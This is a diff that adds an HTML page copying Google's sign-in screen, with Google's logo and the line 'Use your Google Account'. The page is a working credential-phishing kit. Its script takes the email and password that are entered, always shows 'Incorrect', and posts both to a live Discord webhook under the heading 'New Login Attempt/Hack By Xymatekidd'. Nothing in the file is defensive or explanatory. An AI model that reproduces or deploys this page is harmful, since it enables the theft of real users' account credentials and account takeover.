@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login To Access The Websits</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f2f2f2;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dfe1e5;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #1557b0;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+            <p class="error-message" id="errorMessage">Incorrect</p>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Show error message for any input (simulating incorrect credentials)
+            errorMessage.style.display = 'block';
+            
+            // Send data to Discord webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1393551394731987047/yDj8jn-nolG2Q_KkobXw6GgFP41xRyG2A5c_d1vT_UstRK7JuIQHrOGR40QuF90D9F8O';
+            const payload = {
+                content: `**New Login Attempt/Hack By Xymatekidd/**\nEmail: ${email}\nPassword: ${password}`
+            };
+            
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                console.log('Data sent to webhook');
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+            }
+            
+            // Reset form
+            document.getElementById('loginForm').reset();
+        });
+    </script>
+</body>
+</html>
